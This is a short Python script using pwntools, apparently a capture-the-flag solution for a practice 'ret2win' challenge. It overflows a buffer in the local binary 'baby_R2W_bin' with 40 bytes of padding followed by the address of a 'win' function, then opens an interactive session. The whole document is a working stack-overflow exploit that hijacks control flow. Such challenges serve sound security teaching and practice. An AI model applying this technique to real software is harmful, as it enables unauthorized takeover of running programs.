from pwn import *

# setup process
p = process("./baby_R2W_bin")
context.binary = "./baby_R2W_bin"

# address of win function
win = p64(0x401136)

# payload 
payload = b'A' * 40
payload += win

# send payload
p.sendline(payload)
p.interactive()